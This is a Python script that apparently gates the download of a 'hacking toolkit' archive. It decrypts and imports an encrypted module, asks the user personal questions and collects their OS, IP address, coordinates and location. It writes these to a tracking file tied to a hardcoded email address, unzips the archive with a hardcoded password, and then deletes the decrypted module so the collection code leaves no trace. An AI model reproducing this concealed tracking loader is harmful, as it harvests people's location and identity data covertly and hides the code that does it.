from Crypto.Cipher import AES
import hashlib
import os


def decrypt_data(key, filename):
    chunksize = 65536
    outfile = filename[:-4]  # Remove ".enc" from filename
    with open(filename, "rb") as infile:
        iv = infile.read(16)
        hasher = hashlib.sha256(key.encode())
        key = hasher.digest()

        decryptor = AES.new(key, AES.MODE_CBC, iv)

        with open(outfile, "wb") as outfile:
            while True:
                chunk = infile.read(chunksize)
                if len(chunk) == 0:
                    break
                outfile.write(decryptor.decrypt(chunk))


if __name__ == "__main__":
    key = input("Enter decryption key: ")
    decrypt_data(key, "data.py.enc")

    import data
    from datetime import datetime
    import zipfile

    # Get user input
    name = input("What is your name? ")
    age = input("How old are you? ")
    location = input("Where are you from? ")
    reason = input("Why do you want to download this file? ")
    change = input("What would you like to change or how would you change ethically in the world of Cyberspace? ")

    # Collect data
    now = datetime.now()
    os_name = data.get_os_name()
    ip_address = data.get_ip_address()
    coordinates = data.get_coordinates()
    location_data = data.get_location_data()
    time = now.strftime("%Y-%m-%d %H:%M:%S")

    # Write data to JSON file
    data.write_data_to_json(name, age, location, reason, change, os_name, ip_address, coordinates, location_data, time, "track.json", "kendrahzen@gmail.com")

    # Unzip DownloadURL file with password protection
    zip_file = zipfile.ZipFile("DownloadURL.zip")
    zip_file.setpassword("felixultimatehackingpacktoolkit".encode())
    zip_file.extractall()
    zip_file.close()

    # Remove decrypted `data.py` file
    os.remove("data.py")
